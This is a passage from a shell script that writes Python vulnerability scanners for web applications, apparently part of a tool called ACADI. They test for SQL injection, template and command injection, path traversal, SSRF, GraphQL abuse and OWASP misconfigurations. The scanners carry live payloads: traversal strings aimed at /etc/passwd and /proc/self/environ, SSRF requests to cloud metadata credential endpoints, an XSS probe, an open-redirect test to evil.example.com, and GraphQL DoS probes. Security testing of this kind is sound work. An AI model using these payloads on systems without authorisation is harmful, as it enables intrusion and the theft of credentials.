start = time.time()
print(f"  Testing {len(candidates)} injection candidates (budget: {MAX_TIME}s)")

for ep in candidates:
    if time.time() - start > MAX_TIME:
        res['info'].append(f"Time budget ({MAX_TIME}s) reached")
        print(f"  Time budget reached after {res['tested']} tests")
        break

    url    = ep.get('url', '')
    path   = ep.get('path', '')
    method = ep.get('method', 'GET')
    params = ep.get('params', [])
    score  = ep.get('injection_score', 0)
    base_url = url.split('?')[0]
    found  = False

    print(f"  Testing [{score:>3}] {method} {path[:55]}", end=' ', flush=True)

    # Get baseline to compare responses
    b_sc, b_len = baseline(base_url, method)
    if b_sc == 0:
        print("(unreachable)")
        res['tested'] += 1
        continue

    # ── SQLi via GET params ───────────────────────────────────────────────
    test_params = params[:4] if params else ['id', 'q', 'search', 'filter']
    for param in test_params:
        for label, payload in SQLI:
            test_url = base_url + f'?{param}={urllib.parse.quote(str(payload))}'
            sc, body = get(test_url)
            res['tested'] += 1
            if SQLI_ERR.search(body):
                res['vulns'].append(f"SQLi error ({label}) GET {path}?{param}= [score:{score}]")
                found = True
                print(f"SQLi!")
                break
            if time.time() - start > MAX_TIME: break
        if found or time.time() - start > MAX_TIME: break

    # ── SQLi via POST body ────────────────────────────────────────────────
    if not found and method in ('POST', 'PUT', 'PATCH'):
        for param in (test_params or ['id', 'email', 'username', 'search'])[:3]:
            for label, payload in SQLI[:2]:
                sc, body = post(base_url, {param: payload})
                res['tested'] += 1
                if SQLI_ERR.search(body):
                    res['vulns'].append(f"SQLi error ({label}) POST {path} body.{param}= [score:{score}]")
                    found = True
                    print(f"SQLi POST!")
                    break
            if found: break

    # ── SSTI ─────────────────────────────────────────────────────────────
    if not found:
        for param in (test_params or ['name', 'template', 'q'])[:2]:
            for label, payload in SSTI:
                test_url = base_url + f'?{param}={urllib.parse.quote(payload)}'
                sc, body = get(test_url)
                res['tested'] += 1
                if sc == 200 and SSTI_RES.search(body):
                    res['vulns'].append(f"SSTI ({label}) GET {path}?{param}= — 7*7=49 evaluated [score:{score}]")
                    found = True
                    print(f"SSTI!")
                    break
            if found: break

    # ── CMDi (only on high-score endpoints) ──────────────────────────────
    if not found and score >= 50:
        for param in (test_params or ['cmd', 'command', 'exec', 'ping', 'host'])[:2]:
            if param in ('cmd', 'command', 'exec', 'ping', 'host', 'shell', 'run'):
                for label, payload in CMDI:
                    test_url = base_url + f'?{param}={urllib.parse.quote(payload)}'
                    sc, body = get(test_url)
                    res['tested'] += 1
                    if CMDI_RES.search(body):
                        res['vulns'].append(f"CMDi ({label}) GET {path}?{param}= [score:{score}]")
                        found = True
                        print(f"CMDi!")
                        break
                if found: break

    if not found:
        print("clean")

elapsed = time.time() - start
print(f"  Injection: {res['tested']} tests in {elapsed:.0f}s, {len(res['vulns'])} finding(s)")
with open(out_file, 'w') as f:
    json.dump(res, f, indent=2)

ACADI_PYEOF

    # ── Path traversal tester ──────────────────────────────────────────────
    cat > "${PYDIR}/traversal.py" << 'ACADI_PYEOF'
#!/usr/bin/env python3
"""
Smart path traversal tester.
Only tests endpoints pre-classified as file-serving candidates.
Respects a time budget and stops early if no results found.
"""
import sys, json, re, urllib.request, urllib.error, urllib.parse, time, os

classified_file = sys.argv[1] if len(sys.argv) > 1 else ""
out_file        = sys.argv[2] if len(sys.argv) > 2 else "/tmp/traversal.json"
MAX_TIME        = int(sys.argv[3]) if len(sys.argv) > 3 else 60  # seconds budget

UA = os.environ.get('ACADI_UA',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
     '(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36')

res = {"vulns": [], "info": [], "tested": 0, "skipped": 0}

if not classified_file:
    print(json.dumps(res)); sys.exit(0)

try:
    data = json.load(open(classified_file))
except Exception:
    print(json.dumps(res)); sys.exit(0)

candidates = data.get('traversal_candidates', [])
if not candidates:
    print("  No traversal candidates — all endpoints are platform-managed or static")
    print(json.dumps(res))
    sys.exit(0)

# ── Payloads: ordered from most likely to work, fewest requests ────────────
PAYLOADS = [
    ("linux_basic",    "../../../../etc/passwd"),
    ("linux_proc",     "../../../../proc/self/environ"),
    ("url_encoded",    "..%2F..%2F..%2F..%2Fetc%2Fpasswd"),
    ("double_encoded", "..%252F..%252Fetc%252Fpasswd"),
    ("null_byte",      "../../../../etc/passwd%00.png"),
    ("win_hosts",      "../../../../windows/system32/drivers/etc/hosts"),
]

UNIX_SIG = re.compile(r'root:.*:/bin|daemon:.*:/usr|/etc/passwd|UID=')
WIN_SIG  = re.compile(r'127\.0\.0\.1.*localhost|# Copyright.*Microsoft|WINDOWS')
PROC_SIG = re.compile(r'PATH=|HOME=|USER=|SHELL=')

def get(url):
    req = urllib.request.Request(url, headers={'User-Agent': UA, 'Accept': '*/*'})
    try:
        with urllib.request.urlopen(req, timeout=6) as r:
            return r.status, r.read(50_000).decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception:
        return 0, ""

start = time.time()
consecutive_misses = 0

print(f"  Testing {len(candidates)} traversal candidates (budget: {MAX_TIME}s)")
for ep in candidates:
    if time.time() - start > MAX_TIME:
        res['info'].append(f"Time budget ({MAX_TIME}s) reached — stopping")
        print(f"  Time budget reached after {res['tested']} tests")
        break

    url    = ep.get('url', '')
    path   = ep.get('path', '')
    params = ep.get('traversal_params', ep.get('params', []))
    score  = ep.get('traversal_score', 0)
    found  = False

    print(f"  Testing [{score:>3}] {path[:60]}", end=' ', flush=True)

    # Strategy 1: inject via known file-like parameters in query string
    for param in (params or ['file', 'path', 'doc'])[:4]:
        for label, payload in PAYLOADS[:4]:
            test_url = url.split('?')[0] + f'?{param}={urllib.parse.quote(payload, safe="")}'
            sc, body = get(test_url)
            res['tested'] += 1
            if sc == 200 and (UNIX_SIG.search(body) or WIN_SIG.search(body) or PROC_SIG.search(body)):
                res['vulns'].append(
                    f"PATH TRAVERSAL ({label}) at {path}?{param}= "
                    f"[score:{score}] — response contains system file content")
                res['info'].append({'url': test_url, 'param': param,
                                    'payload': payload, 'evidence': body[:200]})
                found = True
                print(f"VULNERABLE!")
                break
            if time.time() - start > MAX_TIME: break
        if found or time.time() - start > MAX_TIME: break

    # Strategy 2: inject in URL path segment (if route looks like /file/{id})
    if not found and '{' in path:
        for label, payload in PAYLOADS[:2]:
            traversal_url = re.sub(r'\{[^}]+\}', urllib.parse.quote(payload, safe=''), url, count=1)
            sc, body = get(traversal_url)
            res['tested'] += 1
            if sc == 200 and (UNIX_SIG.search(body) or WIN_SIG.search(body)):
                res['vulns'].append(
                    f"PATH TRAVERSAL in URL segment ({label}): {path} [score:{score}]")
                found = True
                print(f"VULNERABLE!")
                break

    if not found:
        print("clean")
        consecutive_misses += 1
        if consecutive_misses >= 5 and score < 40:
            res['info'].append("5 consecutive misses on low-score candidates — stopping early")
            print("  Early stop: 5 consecutive misses on low-priority endpoints")
            break
    else:
        consecutive_misses = 0

elapsed = time.time() - start
print(f"  Traversal: {res['tested']} tests in {elapsed:.0f}s, {len(res['vulns'])} finding(s)")
with open(out_file, 'w') as f:
    json.dump(res, f, indent=2)

ACADI_PYEOF

    # ── SSRF tester ────────────────────────────────────────────────────────
    cat > "${PYDIR}/ssrf.py" << 'ACADI_PYEOF'
#!/usr/bin/env python3
"""
Smart SSRF tester. Only tests endpoints with URL-like parameters
or routes that suggest URL fetching (webhook, proxy, redirect, etc.)
"""
import sys, json, re, urllib.request, urllib.error, urllib.parse, time, os

classified_file = sys.argv[1] if len(sys.argv) > 1 else ""
out_file        = sys.argv[2] if len(sys.argv) > 2 else "/tmp/ssrf.json"
MAX_TIME        = int(sys.argv[3]) if len(sys.argv) > 3 else 45

UA = os.environ.get('ACADI_UA',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
     '(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36')

res = {"vulns": [], "info": [], "tested": 0}

if not classified_file:
    print(json.dumps(res)); sys.exit(0)

try:
    data = json.load(open(classified_file))
except Exception:
    print(json.dumps(res)); sys.exit(0)

candidates = data.get('ssrf_candidates', [])
if not candidates:
    print("  No SSRF candidates — no URL-accepting parameters detected")
    print(json.dumps(res))
    sys.exit(0)

# ── SSRF targets: cloud metadata + internal services ─────────────────────
TARGETS = [
    ("AWS-IMDS",     "http://169.254.169.254/latest/meta-data/"),
    ("AWS-IAM",      "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("GCP-meta",     "http://metadata.google.internal/computeMetadata/v1/"),
    ("Azure-meta",   "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    ("localhost",    "http://127.0.0.1/"),
]

# Signatures that confirm the server fetched our target
META_SIG = re.compile(
    r'ami-id|instance-id|iam/|computeMetadata|access_key|'
    r'meta-data|instanceType|availabilityZone|serviceAccountEmail',
    re.IGNORECASE)

def probe(url, timeout=5):
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(20_000).decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='replace')
    except Exception:
        return 0, ""

start = time.time()
print(f"  Testing {len(candidates)} SSRF candidates (budget: {MAX_TIME}s)")

for ep in candidates:
    if time.time() - start > MAX_TIME:
        res['info'].append(f"Time budget ({MAX_TIME}s) reached")
        break

    url    = ep.get('url', '')
    path   = ep.get('path', '')
    ssrf_params = ep.get('ssrf_params', ep.get('params', []))
    score  = ep.get('ssrf_score', 0)
    base_url = url.split('?')[0]
    found  = False

    print(f"  Testing [{score:>3}] {path[:60]}", end=' ', flush=True)

    for param in (ssrf_params or ['url', 'redirect', 'callback'])[:4]:
        for target_name, target_url in TARGETS[:3]:
            test_url = base_url + f'?{param}={urllib.parse.quote(target_url, safe="")}'
            sc, body = probe(test_url)
            res['tested'] += 1
            if sc == 200 and META_SIG.search(body):
                res['vulns'].append(
                    f"CRITICAL SSRF: {path}?{param}= fetches {target_name} metadata!")
                res['info'].append({'param': param, 'target': target_name,
                                    'evidence': body[:300]})
                found = True
                print(f"SSRF-{target_name}!")
                break
            # Blind SSRF hint: server tries but gets network error
            elif sc == 0 and target_url.startswith('http://169.'):
                # Server may have attempted the connection (timed out connecting to metadata)
                res['info'].append(
                    f"Possible blind SSRF at {path}?{param}= — "
                    f"timeout connecting to {target_name} (server may be attempting)")
        if found: break

    if not found:
        print("clean")

elapsed = time.time() - start
print(f"  SSRF: {res['tested']} tests in {elapsed:.0f}s, {len(res['vulns'])} finding(s)")
with open(out_file, 'w') as f:
    json.dump(res, f, indent=2)

ACADI_PYEOF

    # ── GraphQL scanner ────────────────────────────────────────────────────
    cat > "${PYDIR}/graphql.py" << 'ACADI_PYEOF'
import sys, json, re, urllib.request, urllib.error
base=sys.argv[1]; outf=sys.argv[2]
UA=__import__("os").environ.get("ACADI_UA","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"); res={"vulns":[],"info":[],"schema":{},"operations":[]}

def gql(url,query,variables=None):
    body=json.dumps({"query":query,"variables":variables or {}}).encode()
    req=urllib.request.Request(url,data=body,
        headers={"User-Agent":UA,"Content-Type":"application/json","Accept":"application/json"})
    try:
        with urllib.request.urlopen(req,timeout=10) as r:
            return r.status,json.loads(r.read().decode("utf-8",errors="replace"))
    except urllib.error.HTTPError as e:
        try: return e.code,json.loads(e.read().decode())
        except: return e.code,{}
    except Exception:
        return 0,{}

ENDPOINTS=["/graphql","/api/graphql","/v1/graphql","/__graphql","/gql","/api/gql","/query"]
INTRO="""query{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind}}}}}"""

for ep in ENDPOINTS:
    url=base.rstrip("/")+ep
    s,r=gql(url,INTRO)
    if s==200 and "data" in r and r.get("data",{}).get("__schema"):
        res["vulns"].append(f"GraphQL introspection enabled at {ep} — full schema exposed!")
        types=r.get("data",{}).get("__schema",{}).get("types",[])
        res["schema"]["types"]=[t["name"] for t in types if t.get("kind")=="OBJECT"]
        for t in types:
            if t.get("name") in ("Query","Mutation"):
                for f in (t.get("fields") or []):
                    res["operations"].append(f"{t['name']}.{f['name']}")
        # Test depth attack
        depth="{ "+"users { "*10+"id "+"} "*10+" }"
        s2,r2=gql(url,depth)
        if s2==200 and "errors" not in r2:
            res["vulns"].append(f"GraphQL depth limit absent — DoS possible: {ep}")
        # Batch attack
        batch=[{"query":"{ __typename }"}]*100
        bdata=json.dumps(batch).encode()
        req2=urllib.request.Request(url,data=bdata,headers={"User-Agent":UA,"Content-Type":"application/json"})
        try:
            with urllib.request.urlopen(req2,timeout=5) as rb:
                if rb.status==200:
                    res["vulns"].append(f"GraphQL batch queries (100) accepted — DoS possible: {ep}")
        except: pass
        break
    elif s not in (0,404,405):
        res["info"].append(f"GraphQL endpoint found but introspection disabled: {ep}")

print(json.dumps(res,indent=2))
with open(outf,"w") as f: json.dump(res,f,indent=2)
ACADI_PYEOF

    # ── OWASP + WSTG checker ───────────────────────────────────────────────
    cat > "${PYDIR}/owasp.py" << 'ACADI_PYEOF'
import sys, json, re, urllib.request, urllib.error, urllib.parse, ssl

base=sys.argv[1]; hfile=sys.argv[2]; bfile=sys.argv[3]; outf=sys.argv[4]
raw=open(hfile).read() if hfile else ""
bundle=open(bfile).read() if bfile else ""
hdr=raw.lower(); base=base.rstrip("/")
res={"findings":[]}

def finding(fid,title,sev,owasp,mitre,wstg,cvss,desc,ev=""):
    res["findings"].append({"id":fid,"title":title,"severity":sev,"owasp":owasp,
        "mitre":mitre,"wstg":wstg,"cvss_score":cvss,"description":desc,"evidence":ev})

def get(url,hdrs=None,method="GET",body=None):
    data=json.dumps(body).encode() if body else None
    h={"User-Agent":__import__("os").environ.get("ACADI_UA","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"),"Accept":"*/*"}
    if data: h["Content-Type"]="application/json"
    if hdrs: h.update(hdrs)
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    req=urllib.request.Request(url,data=data,headers=h,method=method)
    try:
        with urllib.request.urlopen(req,timeout=8,context=ctx) as r:
            return r.status,dict(r.headers),r.read(200_000).decode("utf-8",errors="replace")
    except urllib.error.HTTPError as e:
        return e.code,{},e.read().decode("utf-8",errors="replace")
    except Exception:
        return 0,{},""

# ── A02: Cryptographic Failures ────────────────────────────────────────────
if base.startswith("https://"):
    http_url=base.replace("https://","http://")
    s,_,_=get(http_url)
    if s==200:
        finding("A02-001","HTTP accessible without HTTPS redirect","HIGH",
                "A02:2021","T1557","WSTG-CRYPST-01",7.5,"App served over plain HTTP.","http:// returns 200")
if "strict-transport-security" not in hdr:
    finding("A02-002","HSTS header missing","MEDIUM","A02:2021","T1557","WSTG-CRYPST-01",6.1,
            "Without HSTS, browsers may connect over HTTP.","Header absent")
else:
    m=re.search(r'max-age=(\d+)',hdr)
    if m and int(m.group(1))<31536000:
        finding("A02-003",f"HSTS max-age too short ({m.group(1)}s)","LOW","A02:2021","T1557","WSTG-CRYPST-01",3.7,
                "HSTS max-age should be at least 31536000 (1 year).",f"max-age={m.group(1)}")

# ── A04: Insecure Design ────────────────────────────────────────────────────
for eu in ["/nonexistent_acadilovable_test","/api/nonexistent","/1/2/3/4/5"]:
    s,_,b=get(base+eu)
    if s in (404,500) and len(b)>100:
        if re.search(r'traceback|stack trace|at line \d+|\.py.*line|node_modules|TypeError:|ReferenceError:',b,re.I):
            finding("A04-001","Stack trace / verbose error disclosure","MEDIUM","A04:2021","T1592",
                    "WSTG-ERRH-01",5.3,"Error responses include stack traces or file paths.",b[:150])
            break

# ── A05: Security Misconfiguration ─────────────────────────────────────────
s,_,b=get(base+"/.git/HEAD")
if s==200 and (b.startswith("ref:") or len(b)>20):
    finding("A05-001","Git repository exposed (.git/HEAD)","CRITICAL","A05:2021","T1552",
            "WSTG-CONFIG-11",9.1,"Source code, credentials, and history accessible.",b[:50])

s,_,b=get(base+"/.env")
if s==200 and len(b)>10 and re.search(r'[A-Z_]+=.{4,}',b):
    finding("A05-002",".env file accessible","CRITICAL","A05:2021","T1552.001",
            "WSTG-CONFIG-02",9.8,"Env file exposes credentials and API keys.",b[:150])

for tp in ["/test","/demo","/dev","/staging","/backup","/old","/temp"]:
    s,_,b=get(base+tp)
    if s==200 and len(b)>100:
        finding("A05-003",f"Non-production path accessible: {tp}","MEDIUM","A05:2021","T1195",
                "WSTG-CONFIG-02",5.3,"Test/dev paths accessible in production.",tp)
        break

# Dir listing
for dl in ["/assets/","/static/","/public/","/uploads/"]:
    s,_,b=get(base+dl)
    if s==200 and re.search(r'Index of /|Directory listing|<a href="\.\."',b,re.I):
        finding("A05-004",f"Directory listing enabled: {dl}","HIGH","A05:2021","T1083",
                "WSTG-CONFIG-04",7.5,"Server lists directory contents.",dl)
        break

s,_,b=get(base+"/package.json")
if s==200 and '"dependencies"' in b:
    finding("A05-005","package.json publicly accessible","LOW","A05:2021","T1592",
            "WSTG-INFO-02",3.7,"Exact dependency versions help attackers find CVEs.",b[:150])

# ── A06: Vulnerable Components ──────────────────────────────────────────────
srv=re.search(r'server:\s*(.+)',raw,re.I)
if srv:
    sv=srv.group(1).strip()
    if re.search(r'\d+\.\d+',sv):
        finding("A06-001",f"Server header discloses version: {sv}","LOW","A06:2021","T1592.002",
                "WSTG-INFO-02",3.7,"Version info enables targeted CVE attacks.",sv)

# ── A07: Auth Failures ──────────────────────────────────────────────────────
for ck in re.findall(r'set-cookie:([^\n]+)',raw,re.I):
    cl=ck.lower()
    name=re.search(r'^\s*([^=]+)=',ck)
    n=name.group(1).strip() if name else "?"
    if "httponly" not in cl:
        finding("A07-001",f"Cookie '{n}' missing HttpOnly","MEDIUM","A07:2021","T1539",
                "WSTG-SESS-02",5.4,"Cookie accessible via JavaScript — XSS can steal sessions.",ck[:80])
    if "secure" not in cl:
        finding("A07-002",f"Cookie '{n}' missing Secure flag","MEDIUM","A07:2021","T1539",
                "WSTG-SESS-02",5.4,"Cookie sent over plain HTTP — MitM interception risk.",ck[:80])
    if "samesite" not in cl:
        finding("A07-003",f"Cookie '{n}' missing SameSite","LOW","A07:2021","T1539",
                "WSTG-SESS-02",4.3,"Missing SameSite enables CSRF attacks.",ck[:80])

# ── A08: Software Integrity ─────────────────────────────────────────────────
_,_,html=get(base+"/",{"Accept":"text/html"})
ext_scripts=re.findall(r'<script[^>]+src=["\']https?://(?!'+re.escape(base.replace("https://","").replace("http://","").split("/")[0])+r')[^"\']+["\']',html)
no_sri=[s for s in ext_scripts if 'integrity=' not in s]
if no_sri:
    finding("A08-001",f"External scripts without SRI: {len(no_sri)}","MEDIUM","A08:2021","T1195.002",
            "WSTG-CLNT-13",6.1,"External JS without SRI allows supply chain attacks.",str(no_sri[0])[:120])

# ── WSTG checks ─────────────────────────────────────────────────────────────
# robots.txt
s,_,robots=get(base+"/robots.txt")
if s==200:
    disallowed=re.findall(r'Disallow:\s*(.+)',robots)
    sensitive=[d for d in disallowed if any(x in d.lower() for x in ["admin","api","backup","config","private","secret"])]
    if sensitive:
        finding("WSTG-INFO-01","robots.txt reveals sensitive paths","INFO","A05:2021","T1592",
                "WSTG-INFO-01",2.0,"Disallowed paths hint at restricted areas for attackers.","\n".join(sensitive[:5]))

# TRACE
s,_,b=get(base+"/",method="TRACE")
if s==200 and "TRACE" in b:
    finding("WSTG-CONFIG-06","HTTP TRACE method enabled","MEDIUM","A05:2021","T1557",
            "WSTG-CONFIG-06",5.8,"TRACE enables Cross-Site Tracing (XST).",f"HTTP {s}")

# X-Frame-Options / clickjacking
csp_v=re.search(r'content-security-policy:(.+)',raw,re.I)
csp_str=csp_v.group(1) if csp_v else ""
xfo=re.search(r'x-frame-options:',raw,re.I)
if "frame-ancestors" not in csp_str and not xfo:
    finding("WSTG-CLNT-09","No clickjacking protection","MEDIUM","A05:2021","T1204",
            "WSTG-CLNT-09",4.3,"Page can be embedded in iframes for clickjacking.",
            "Missing X-Frame-Options and CSP frame-ancestors")

# CSP quality
if "content-security-policy" in hdr:
    if "unsafe-inline" in hdr:
        finding("WSTG-CLNT-10","CSP allows unsafe-inline","MEDIUM","A03:2021","T1059.007",
                "WSTG-CLNT-10",6.1,"Inline scripts/styles allowed — XSS mitigations weakened.","unsafe-inline")
    if "unsafe-eval" in hdr:
        finding("WSTG-CLNT-11","CSP allows unsafe-eval","MEDIUM","A03:2021","T1059.007",
                "WSTG-CLNT-11",5.3,"eval() and similar allowed — code injection risk.","unsafe-eval")
else:
    finding("WSTG-CLNT-12","Content-Security-Policy header missing","MEDIUM","A05:2021","T1059.007",
            "WSTG-CLNT-12",6.1,"No CSP — XSS attacks have full impact.","Header absent")

# Referrer-Policy
if "referrer-policy" not in hdr:
    finding("WSTG-CLNT-17","Referrer-Policy missing","LOW","A05:2021","T1592",
            "WSTG-CLNT-17",3.7,"URLs with sensitive params may leak in Referer header.","Header absent")

# Reflected XSS probe
XSS_PROBE="<script>alert(1)</script>"
for xep in ["/search","/api/search","/api/users","/find"]:
    s,_,b=get(f"{base}{xep}?q={urllib.parse.quote(XSS_PROBE)}")
    if s==200 and XSS_PROBE in b:
        finding("WSTG-CLNT-01",f"Reflected XSS: {xep}?q=","HIGH","A03:2021","T1059.007",
                "WSTG-CLNT-01",8.2,"User input reflected unescaped — executes arbitrary JS.",f"Payload reflected at {xep}")
        break

# X-Content-Type-Options
if "x-content-type-options" not in hdr:
    finding("WSTG-CLNT-XX","X-Content-Type-Options missing","LOW","A05:2021","T1592",
            "WSTG-CLNT-13",3.7,"Browser may MIME-sniff responses — enables content injection.","Header absent")

# Permissions-Policy
if "permissions-policy" not in hdr and "feature-policy" not in hdr:
    finding("WSTG-CLNT-YY","Permissions-Policy missing","LOW","A05:2021","T1592",
            "WSTG-CLNT-13",2.0,"Browser features unrestricted — camera/mic/geo may be exploitable.","Header absent")

# Open redirect
rdir=None
try:
    import urllib.request as ur
    req3=ur.Request(f"{base}/login?redirect=https://evil.example.com",headers={"User-Agent":__import__("os").environ.get("ACADI_UA","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")})
    with ur.urlopen(req3,timeout=6) as r3:
        rdir=r3.url
except: pass
if rdir and "evil.example.com" in rdir:
    finding("WSTG-CLNT-04",f"Open redirect: /login?redirect=","MEDIUM","A01:2021","T1204",
            "WSTG-CLNT-04",6.1,"Redirects to arbitrary external URLs — phishing enabler.",rdir)

sev_order={"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
res["findings"].sort(key=lambda f: sev_order.get(f.get("severity","INFO"),5))
summary={"CRITICAL":0,"HIGH":0,"MEDIUM":0,"LOW":0,"INFO":0}
for f in res["findings"]: summary[f["severity"]]=summary.get(f["severity"],0)+1
res["summary"]=summary

print(json.dumps(res,indent=2))
with open(outf,"w") as f: json.dump(res,f,indent=2)
ACADI_PYEOF

    # ── classify.py ────────────────────────────────────────────────────────
    cat > "${PYDIR}/classify.py" << 'ACADI_PYEOF'
#!/usr/bin/env python3
"""
Endpoint classifier — scores each endpoint for relevance per test type.
Only routes candidates worth testing to each scanner.
"""
import sys, json, re, urllib.parse

eps_file  = sys.argv[1] if len(sys.argv) > 1 else ""
fuzz_file = sys.argv[2] if len(sys.argv) > 2 else ""
out_file  = sys.argv[3] if len(sys.argv) > 3 else "/tmp/classified.json"

# ── Patterns ─────────────────────────────────────────────────────────────────
STATIC_EXT = re.compile(
    r'\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|mp4|mp3|pdf|zip|gz|map)$',
    re.IGNORECASE)

SUPABASE_REST    = re.compile(r'/rest/v1/')
SUPABASE_AUTH    = re.compile(r'/auth/v1/')
SUPABASE_STORAGE = re.compile(r'/storage/v1/')
SUPABASE_EDGE    = re.compile(r'/functions/v1/')
FIREBASE_PAT     = re.compile(r'firebaseio\.com|firestore\.googleapis|identitytoolkit')
GRAPHQL_PAT      = re.compile(r'/graphql$|/graphiql$|/gql$', re.IGNORECASE)
NEXTJS_DATA_PAT  = re.compile(r'/_next/data/')
SWAGGER_PAT      = re.compile(r'/swagger|/openapi|/api-docs|/redoc', re.IGNORECASE)
ADMIN_PAT        = re.compile(r'/admin|/panel|/console|/backoffice', re.IGNORECASE)

# File-serving route names
FILE_ROUTES = re.compile(
    r'/(file|download|doc|upload|static|media|image|attachment|asset|read|'
    r'view|get-file|fetch-file|open|load|template|export|report)',
    re.IGNORECASE)

# Query/path parameter names that suggest file input
FILE_PARAMS = {
    'file', 'path', 'filename', 'filepath', 'doc', 'document',
    'download', 'resource', 'template', 'page', 'include', 'load',
    'read', 'open', 'view', 'src', 'source', 'dir', 'folder',
    'location', 'attachment', 'content', 'name', 'f', 'p'
}

# URL-fetch parameter names (SSRF candidates)
URL_PARAMS = {
    'url', 'uri', 'redirect', 'next', 'return', 'returnurl',
    'callback', 'webhook', 'endpoint', 'proxy', 'image', 'img',
    'feed', 'target', 'dest', 'destination', 'link', 'fetch',
    'request', 'host', 'server', 'domain', 'origin', 'site',
    'goto', 'continue', 'forward', 'redir', 'to'
}

# Routes that suggest URL fetching
URL_ROUTES = re.compile(
    r'/(webhook|callback|proxy|redirect|fetch|import|notify|ping|'
    r'forward|relay|mirror|rss|atom|feed|preview)',
    re.IGNORECASE)

# Routes that suggest dynamic data (injection candidates)
DYNAMIC_ROUTES = re.compile(
    r'/(search|find|query|filter|list|users?|items?|products?|orders?|'
    r'posts?|messages?|records?|data|results?|lookup|api/v\d)',
    re.IGNORECASE)

# Routes that are definitely NOT injection candidates
NO_INJECT_ROUTES = re.compile(
    r'/(auth|login|signup|logout|oauth|token|refresh|password|reset|'
    r'verify|confirm|activate|__next|_next|__vite|hot-update)',
    re.IGNORECASE)


def parse_params(url):
    try:
        qs = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
        return set(k.lower() for k in qs.keys())
    except Exception:
        return set()

def path_of(url):
    try:    return urllib.parse.urlparse(url).path.lower()
    except: return url.lower()


def classify(url, method, source, tag, accessible=False):
    path   = path_of(url)
    params = parse_params(url)

    rec = {
        'url': url, 'method': method, 'path': path,
        'source': source, 'tag': tag, 'params': sorted(params),
        'accessible': accessible, 'category': 'unknown', 'skip': False,
        'traversal_score': 0, 'injection_score': 0,
        'ssrf_score': 0, 'xss_score': 0,
        'traversal_params': [], 'ssrf_params': []
    }

    # ── Hard skip: static files ────────────────────────────────────────────
    if STATIC_EXT.search(path):
        rec['skip'] = True; rec['category'] = 'static'
        return rec

    # ── Platform-specific — handled by dedicated scanners ──────────────────
    if SUPABASE_REST.search(url):
        rec['category'] = 'supabase-rest'
        # Supabase REST is protected by PostgREST + RLS — not a traversal/injection target
        rec['traversal_score'] = -100
        rec['injection_score'] = -100
        rec['ssrf_score']      = -100
        return rec

    if SUPABASE_AUTH.search(url):
        rec['category'] = 'supabase-auth'
        rec['traversal_score'] = -100
        rec['injection_score'] = -100
        rec['ssrf_score']      = -100
        return rec

    if SUPABASE_STORAGE.search(url) or SUPABASE_EDGE.search(url):
        rec['category'] = 'supabase-service'
        rec['traversal_score'] = -100
        rec['injection_score'] = -100
        return rec

    if FIREBASE_PAT.search(url):
        rec['category'] = 'firebase'
        rec['traversal_score'] = -100
        return rec

    if GRAPHQL_PAT.search(url):
        rec['category'] = 'graphql'
        rec['traversal_score'] = -100
        return rec

    if SWAGGER_PAT.search(url):
        rec['category'] = 'swagger'; rec['skip'] = True
        return rec

    if NEXTJS_DATA_PAT.search(url):
        rec['category'] = 'nextjs-data'
        rec['injection_score'] = 15
        rec['traversal_score'] = -50
        return rec

    # ── Traversal score ────────────────────────────────────────────────────
    tr = 0
    if FILE_ROUTES.search(path):
        tr += 60
    fp = params & FILE_PARAMS
    if fp:
        tr += 50
        rec['traversal_params'] = sorted(fp)
    if '/static/' in path or '/media/' in path or '/files/' in path:
        tr += 30
    if accessible:
        tr += 15
    # Penalise: dynamic query APIs without file hints
    if DYNAMIC_ROUTES.search(path) and not FILE_ROUTES.search(path) and not fp:
        tr -= 30
    rec['traversal_score'] = max(-100, tr)

    # ── Injection score ────────────────────────────────────────────────────
    inj = 0
    if DYNAMIC_ROUTES.search(path):
        inj += 50
    if params:
        inj += 25  # Has query params → can receive input
    if method == 'POST':
        inj += 15  # POST bodies worth probing
    if NO_INJECT_ROUTES.search(path):
        inj -= 50
    if FILE_ROUTES.search(path) and not DYNAMIC_ROUTES.search(path):
        inj -= 20  # Pure file server, lower SQL risk
    if accessible:
        inj += 20
    rec['injection_score'] = max(-100, inj)

    # ── SSRF score ─────────────────────────────────────────────────────────
    ssrf = 0
    sp = params & URL_PARAMS
    if sp:
        ssrf += 80
        rec['ssrf_params'] = sorted(sp)
    if URL_ROUTES.search(path):
        ssrf += 50
    if NO_INJECT_ROUTES.search(path) and not sp:
        ssrf -= 30
    if accessible:
        ssrf += 10
    rec['ssrf_score'] = max(-100, ssrf)

    # ── XSS score ─────────────────────────────────────────────────────────
    xss = 0
    if method == 'GET' and params:
        xss += 40
    if DYNAMIC_ROUTES.search(path):
        xss += 20
    if accessible:
        xss += 15
    rec['xss_score'] = max(-100, xss)

    # ── Final category ─────────────────────────────────────────────────────
    if ADMIN_PAT.search(path):
        rec['category'] = 'admin-panel'
        rec['injection_score'] = max(rec['injection_score'], 40)
    elif rec['traversal_score'] >= 30:
        rec['category'] = 'file-serving'
    elif rec['ssrf_score']      >= 30:
        rec['category'] = 'url-fetching'
    elif rec['injection_score'] >= 30:
        rec['category'] = 'api-dynamic'
    else:
        rec['category'] = 'api-generic'

